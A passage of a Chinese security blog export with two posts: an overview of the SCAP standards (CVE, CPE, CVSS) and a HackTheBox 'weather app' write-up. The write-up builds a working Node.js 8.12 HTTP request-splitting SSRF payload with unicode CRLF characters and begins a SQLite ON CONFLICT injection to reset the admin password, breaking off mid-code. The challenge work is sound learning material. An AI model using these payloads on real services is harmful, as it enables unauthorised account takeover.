[{"title":"漏洞管理scap协议","url":"http://blog.le31ei.top/2021/06/02/漏洞管理scap协议/","content":"<p>最近工作中了解到了scap协议，需要用到中间的几个模块，遂专门抽时间对scap进行了深入的学习。本文记录一下学习过程，以及自己的相关理解。</p>\n<h1 id=\"1-概念\"><a href=\"#1-概念\" class=\"headerlink\" title=\"1. 概念\"></a>1. 概念</h1><p>scap根据维基百科的解释是安全内容自动化协议，是用于自动化漏洞管理、评估和条款符合检测的一套标准，结合了一系列用于评估软件缺陷和安全相关问题的开放标准，用于系统测试来发现漏洞，并根据漏洞可能造成的影响提供评分标准。是意图将上述开放标准用于自动化漏洞管理、评估和条款符合检测的一套标准。</p>\n<p>简单来说，scap协议就是为了将漏洞管理做一个统一的规范，形成自己特有的生态系统。目前大多数漏洞均有CVE编号，CVE就是Scap的一个部分，主要是为了统一漏洞描述、修补建议、影响范围等，避免不同的厂商对同一个漏洞的定义有不同的定义，从而形成规范化的漏洞管理。本文以最新的SCAP1.3作为介绍的版本。</p>\n<h1 id=\"2-协议\"><a href=\"#2-协议\" class=\"headerlink\" title=\"2. 协议\"></a>2. 协议</h1><p>scap主要由以下协议组成，部分组件为大家所熟悉的：</p>\n<blockquote>\n<ol>\n<li>Asset Identification 资产识别</li>\n<li>Asset Reporting Format (ARF)  资产报告规范</li>\n<li>Common Configuration Enumeration (CCE)  通用配置枚举</li>\n<li>Common Platform Enumeration (CPE) 通用平台枚举</li>\n<li>Open Vulnerability Assessment Language (OVAL) 开放漏洞评估语言</li>\n<li>Open Checklist Interactive Language (OCIL)  开放式交互语言</li>\n<li>Trust Model for Security Automation Data (TMSAD) 安全自动化数据的信任模型</li>\n<li>Extensible Configuration Checklist Description Format (XCCDF) 可扩展配置清单描述格式</li>\n<li>Software Identification (SWID) 软件标识</li>\n</ol>\n</blockquote>\n<p>一般常用的协议如下：</p>\n<p><img src=\"/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602203848073.png\" alt=\"image-20210602203848073\"></p>\n<p>随便打开一个NVD存放的cve漏洞信息，可以找到几个模块的常见使用，第一个就是CVE编号，已经成为业界公用的漏洞标识，</p>\n<p>第二个CVSS评分</p>\n<p><img src=\"/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602204446373.png\" alt=\"image-20210602204446373\"></p>\n<p>第三个CPE信息</p>\n<p><img src=\"/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602204502667.png\" alt=\"image-20210602204502667\"></p>\n<p>可以看到美国的漏洞管理已经形成了统一的标准，采用SCAP这一系列的协议，能够非常标准化的管理所有漏洞。</p>\n<h1 id=\"3-常见组件和协议\"><a href=\"#3-常见组件和协议\" class=\"headerlink\" title=\"3. 常见组件和协议\"></a>3. 常见组件和协议</h1><p><strong>CVE</strong></p>\n<p>通用的漏洞库，基本上常见的组件如果存在漏洞的话，基本会有对应的CVE编号。安全研究者一般在找到通用软件漏洞的时候，也会提交给相关厂商申请CVE编号，可以说现在安全研究者就是以CVE数量作为自己的能力体现。</p>\n<p>CVE编号通常为CVE-2021-xxxx，中间为年份，最后的数字为漏洞编号。CVE网站<a href=\"https://cve.mitre.org/\">https://cve.mitre.org/</a>可以根据编号搜索到对应的漏洞描述。描述中通常包含漏洞影响的组件、影响的范围以及对应的CVSS评分和修复建议等详细信息。</p>\n<p><img src=\"/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602210424116.png\" alt=\"image-20210602210424116\"></p>\n<p><strong>CPE</strong></p>\n<p>相当于一个识别码，<strong>SCAP的一种开源实现OPENSCAP采用的思想就是，在服务器中收集软件和系统的CPE信息，然后匹配CVE中对应的指纹来查找漏洞</strong>。</p>\n<p>该方式相对于传统的扫描有如下几种优势：</p>\n<blockquote>\n<ol>\n<li>大部分漏洞不会有POC或者EXP，采用CPE匹配的方式可以检测出来这部分漏洞</li>\n<li>不用主动扫描，不会对网络造成压力</li>\n<li>检测快速精准，比传统的远程扫描有更高 的精准度</li>\n</ol>\n</blockquote>\n<p>但该方式也有他的问题所在</p>\n<blockquote>\n<ol>\n<li>跟离线的配置检查类似，需要采用探针的方式进行检查，对于未发现的灰色资产是没有办法进行检测的，只能对已经发现的纳管资产进行检查</li>\n<li>针对于国产或者小厂商的软件或者系统不存在CPE的情况下，该种方式是没办法进行检测的</li>\n</ol>\n</blockquote>\n<p><strong>CVSS</strong></p>\n<p>通用漏洞评分系统，CVE采用该套评分标准对一个漏洞进行定义评分。目前最新的版本是3.1。此处不详细扩展相关介绍，后期专项学习的时候再详细说明。</p>\n<p>以上就是SCAP中常用的几种协议或者工具，此处仅做简单介绍，有兴趣的话，可查找相关原文进行学习。</p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><a href=\"https://zh.wikipedia.org/zh-hans/%E5%AE%89%E5%85%A8%E5%86%85%E5%AE%B9%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8D%8F%E8%AE%AE\">维基百科：安全内容自动化协议</a></li>\n<li><a href=\"https://www.fooying.com/common_vulnerability_management_and_scap/?utm_source=wechat_session&utm_medium=social&utm_oi=1114265509834715136#%E8%AF%84%E5%88%86%E7%A4%BA%E4%BE%8B\">通用漏洞管理与SCAP</a></li>\n<li><a href=\"https://csrc.nist.gov/Projects/Security-Content-Automation-Protocol/Specifications/arf\">https://csrc.nist.gov/Projects/Security-Content-Automation-Protocol/Specifications/arf</a></li>\n<li><a href=\"./SCAP_Standard_introduction_Li.Zhang.pdf\">SCAP 标准简介</a></li>\n<li><a href=\"https://nvd.nist.gov/ncp/repository?orderBy=modifiedDate&orderDirection=desc&startIndex=440\">National Checklist Program Repository</a></li>\n</ol>\n","categories":["安全咨询"],"tags":["scap"]},{"title":"nodejs请求走私与ssrf","url":"http://blog.le31ei.top/2021/05/23/nodejs请求走私与ssrf/","content":"<p>最近看到hackthebox一道题，关于nodejs请求走私的，学到不少东西，这里记录一下。</p>\n<h1 id=\"1-先说题目\"><a href=\"#1-先说题目\" class=\"headerlink\" title=\"1. 先说题目\"></a>1. 先说题目</h1><p>题目直接给了源码，题目名字是<code>weather app</code>，大家有兴趣可以直接去hackthebox做这道题。</p>\n<p>源码是nodejs的，docker环境，代码功能看起来很简单，一共三个功能。分别是：登录(login)，注册(register)和查询天气的api接口(/api/weather)。</p>\n<p>在注册的代码中检查了来源ip是不是<code>127.0.0.1</code>，使用的是<code>req.socket.remoteAddress</code>，这种情况是没办法绕过的。所以需要通过查询天气的api接口来进行ssrf攻击。</p>\n<p>以下贴一下关键部分的代码</p>\n<p><code>WeatherHelper.js</code>这是查询天气接口的api，endpoint、city和country三个参数可控，可以通过该处进行ssrf攻击</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"title\">getWeather</span>(<span class=\"params\">res, endpoint, city, country</span>)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// *.openweathermap.org is out of scope</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> apiKey = <span class=\"string\">&#x27;10a62430af617a949055a46fa6dec32f&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> weatherData = <span class=\"keyword\">await</span> HttpHelper.HttpGet(<span class=\"string\">`http://<span class=\"subst\">$&#123;endpoint&#125;</span>/data/2.5/weather?q=<span class=\"subst\">$&#123;city&#125;</span>,<span class=\"subst\">$&#123;country&#125;</span>&amp;units=metric&amp;appid=<span class=\"subst\">$&#123;apiKey&#125;</span>`</span>); </span><br><span class=\"line\">        </span><br></pre></td></tr></table></figure>\n\n<p><code>router/index.js</code>：这是路由的代码，有三个关键接口<code>/login</code>、<code>/register</code>、<code>/api/weather</code>，关键代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.post(<span class=\"string\">&#x27;/register&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.socket.remoteAddress.replace(<span class=\"regexp\">/^.*:/</span>, <span class=\"string\">&#x27;&#x27;</span>) != <span class=\"string\">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.status(<span class=\"number\">401</span>).end();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; username, password &#125; = req.body;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (username &amp;&amp; password) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> db.register(username, password)</span><br><span class=\"line\">            .then(<span class=\"function\">()  =&gt;</span> res.send(response(<span class=\"string\">&#x27;Successfully registered&#x27;</span>)))</span><br><span class=\"line\">            .catch(<span class=\"function\">() =&gt;</span> res.send(response(<span class=\"string\">&#x27;Something went wrong&#x27;</span>)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.send(response(<span class=\"string\">&#x27;Missing parameters&#x27;</span>));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(<span class=\"string\">&#x27;/login&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (username &amp;&amp; password) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> db.isAdmin(username, password)</span><br><span class=\"line\">            .then(<span class=\"function\"><span class=\"params\">admin</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (admin) <span class=\"keyword\">return</span> res.send(fs.readFileSync(<span class=\"string\">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class=\"line\">                <span class=\"keyword\">return</span> res.send(response(<span class=\"string\">&#x27;You are not admin&#x27;</span>));</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">            .catch(<span class=\"function\">() =&gt;</span> res.send(response(<span class=\"string\">&#x27;Something went wrong&#x27;</span>)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> re.send(response(<span class=\"string\">&#x27;Missing parameters&#x27;</span>));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(<span class=\"string\">&#x27;/api/weather&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; endpoint, city, country &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> WeatherHelper.getWeather(res, endpoint, city, country);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.send(response(<span class=\"string\">&#x27;Missing parameters&#x27;</span>));</span><br><span class=\"line\">&#125;);    </span><br></pre></td></tr></table></figure>\n\n<p><code>views/database.js</code>：这是创建数据库和两个判断函数的文件。创建的user表中的admin密码字段为随机字段。关键代码如下</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"title\">migrate</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.db.exec(<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">            DROP TABLE IF EXISTS users;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            CREATE TABLE IF NOT EXISTS users (</span></span><br><span class=\"line\"><span class=\"string\">                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class=\"line\"><span class=\"string\">                username   VARCHAR(255) NOT NULL UNIQUE,</span></span><br><span class=\"line\"><span class=\"string\">                password   VARCHAR(255) NOT NULL</span></span><br><span class=\"line\"><span class=\"string\">            );</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;<span class=\"subst\">$&#123; crypto.randomBytes(<span class=\"number\">32</span>).toString(<span class=\"string\">&#x27;hex&#x27;</span>) &#125;</span>&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        `</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"title\">register</span>(<span class=\"params\">user, pass</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> add parameterization and roll public</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"keyword\">async</span> (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> query = <span class=\"string\">`INSERT INTO users (username, password) VALUES (&#x27;<span class=\"subst\">$&#123;user&#125;</span>&#x27;, &#x27;<span class=\"subst\">$&#123;pass&#125;</span>&#x27;)`</span>;</span><br><span class=\"line\">                resolve((<span class=\"keyword\">await</span> <span class=\"built_in\">this</span>.db.run(query)));</span><br><span class=\"line\">            &#125; <span class=\"function\"><span class=\"title\">catch</span>(<span class=\"params\">e</span>)</span> &#123;</span><br><span class=\"line\">                reject(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"title\">isAdmin</span>(<span class=\"params\">user, pass</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"keyword\">async</span> (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> smt = <span class=\"keyword\">await</span> <span class=\"built_in\">this</span>.db.prepare(<span class=\"string\">&#x27;SELECT username FROM users WHERE username = ? and password = ?&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">let</span> row = <span class=\"keyword\">await</span> smt.get(user, pass);</span><br><span class=\"line\">                resolve(row !== <span class=\"literal\">undefined</span> ? row.username == <span class=\"string\">&#x27;admin&#x27;</span> : <span class=\"literal\">false</span>);</span><br><span class=\"line\">            &#125; <span class=\"function\"><span class=\"title\">catch</span>(<span class=\"params\">e</span>)</span> &#123;</span><br><span class=\"line\">                reject(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>根据以上代码不难看出这道题的解题思路：</p>\n<ol>\n<li>根据weather api的查询接口，发起ssrf攻击</li>\n<li>ssrf对register接口进行攻击，注册一个用户</li>\n<li>注册的时候利用views/database.js中的register函数的注入漏洞</li>\n<li>登录admin账户即可拿到flag</li>\n</ol>\n<p>思路有了，那么几个关键点就出来了，如何发起ssrf攻击？如何利用注入漏洞？</p>\n<h1 id=\"2-nodejs请求走私\"><a href=\"#2-nodejs请求走私\" class=\"headerlink\" title=\"2. nodejs请求走私\"></a>2. nodejs请求走私</h1><p>题目给了dockerfile文件，其中的关键点就在<code>FROM node:8.12.0-alpine</code>，nodejs指定版本8.12。这个版本已经很老了，目前我使用的版本都v15.x了，所以特定指定该版本，肯定是要利用nodejs的相关漏洞。</p>\n<p>通过搜索不难发现nodejs 8.12存在拆分攻击漏洞（请求走私）。在http get请求的时候，没有处理好unicode字符，导致可以构造回车换行符来修改http流量，可以在正常请求中夹带另一个请求。具体的漏洞原理可以查看<a href=\"https://xz.aliyun.com/t/2894\">《通过拆分攻击实现的SSRF攻击》</a>。</p>\n<p>而在该题目中，需要通过weather查询的api，来构造一个post到register的请求。</p>\n<p>那么我们第一步就是要构造一个正常的注册包，题目给了源码，可以直接在本地用docker起起来。在调试的时候，为了方便可以暂时把判断<code>127.0.0.1</code>的代码给注释掉。</p>\n<p>构造正常的注册包如下，注意<code>Content-Type</code>和<code>Content-Length</code>是两个必要的字段，参数上面仅有一行空余：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/register</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1:1337</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 38</span><br><span class=\"line\"></span><br><span class=\"line\">username=admixxxn2&amp;password=admin2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>构造如上数据包后，可以正常进行注册。该处有个小的tips，就是<code>Content-Type</code>如果使用<code>application/json</code>的话，会存在编码问题。nodejs的httpget函数在发起请求时，会对特殊字符采用URL编码，如果要请求走私的话，提交的json字符的<code>&#123;</code>、<code>&#125;</code>、<code>&quot;</code>都会被直接URL编码，如果夹在正常的http包中，服务端不会正常解码，会全部判断为body字符，导致json解码失败。</p>\n<p><img src=\"/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/image-20210523175455654.png\" alt=\"image-20210523175455654\"></p>\n<p>第二步就是要通过请求走私的漏洞，构造一个原始的POST包，混合在正常的数据包中。根据漏洞原理，对于回车换行符可以采用<code>\\u010D\\u010A</code>，空格可以采用<code>\\u0120</code>进行替换。</p>\n<p>所以构造出来的数据包如下：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\u010D\\u010APOST\\u0120/register\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:1337\\u010D\\u010AContent-Type:\\u0120application/x-www-form-urlencoded\\u010D\\u010AContent-Length:\\u012086\\u010D\\u010A\\u010D\\u010Ausername=admin&amp;password=admin2\\u010D\\u010A\\u010D\\u010AGET\\u0120/123</span><br></pre></td></tr></table></figure>\n\n<p>在nodejs中编写如下代码，然后nc监听即可通过nc查看构造的包</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;http&quot;</span>);</span><br><span class=\"line\">http.get(<span class=\"string\">&quot;http://127.0.0.1:8888/query?param=1\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:8888\\u010D\\u010A\\u010D\\u010A\\u010D\\u010APOST\\u0120/register\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:1337\\u010D\\u010AContent-Type:\\u0120application/x-www-form-urlencoded\\u010D\\u010AContent-Length:\\u012086\\u010D\\u010A\\u010D\\u010Ausername=admin2&amp;password=admin2\\u010D\\u010A\\u010D\\u010AGET\\u0120/123&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>nc可得到构造好的数据包</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/app # nc -lvvp 8888</span><br><span class=\"line\">listening on [::]:8888 ...</span><br><span class=\"line\">connect to [::ffff:127.0.0.1]:8888 from localhost:47630 ([::ffff:127.0.0.1]:47630)</span><br><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/query?param=1</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1:80</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/register</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1:1337</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 35</span><br><span class=\"line\"></span><br><span class=\"line\">username=admin2&amp;password=admin2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/123/data/2.5/weather?q=2,3&amp;units=metric&amp;appid=10a62430af617a949055a46fa6dec32f</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1:8888</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br></pre></td></tr></table></figure>\n\n<p>最后一步很简单，就是将数据包放入到weather查询的api当中</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/api/weather</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1:1337</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: max-age=0</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class=\"line\"><span class=\"attribute\">If-None-Match</span>: W/&quot;40a-17749845bb8&quot;</span><br><span class=\"line\"><span class=\"attribute\">If-Modified-Since</span>: Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 474</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/query?param=1\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:80\\u010D\\u010A\\u010D\\u010A\\u010D\\u010APOST\\u0120/register\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:80\\u010D\\u010AContent-Type:\\u0120application/x-www-form-urlencoded\\u010D\\u010AContent-Length:\\u012090\\u010D\\u010A\\u010D\\u010Ausername=admin2&amp;password=admin2\\u010D\\u010A\\u010D\\u010AGET\\u0120/123&quot;,&quot;city&quot;:&quot;2&quot;,&quot;country&quot;: &quot;3&quot;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"3-sqlite注入\"><a href=\"#3-sqlite注入\" class=\"headerlink\" title=\"3. sqlite注入\"></a>3. sqlite注入</h1><p>上面的ssrf问题解决了，最后一个问题来了，sqlite的注入怎么利用？</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"title\">register</span>(<span class=\"params\">user, pass</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">TODO:</span> add parameterization and roll public</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"keyword\">async</span> (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> query = <span class=\"string\">`INSERT INTO users (username, password) VALUES (&#x27;<span class=\"subst\">$&#123;user&#125;</span>&#x27;, &#x27;<span class=\"subst\">$&#123;pass&#125;</span>&#x27;)`</span>;</span><br><span class=\"line\">            resolve((<span class=\"keyword\">await</span> <span class=\"built_in\">this</span>.db.run(query)));</span><br><span class=\"line\">        &#125; <span class=\"function\"><span class=\"title\">catch</span>(<span class=\"params\">e</span>)</span> &#123;</span><br><span class=\"line\">            reject(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到，注入点在insert里面，一般针对mysql的话，注入点在insert后，一般采用的是报错注入，但这道题是sqlite的后端数据库。</p>\n<p>经过一番搜索，针对这道题可以采用<code>ON CONFLICT DO UPDATE</code>的语法，在插入时候如果有冲突的话，则将admin的密码改成我们已知的密码。</p>\n<p>以上的注入点可以构造如下语法:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span 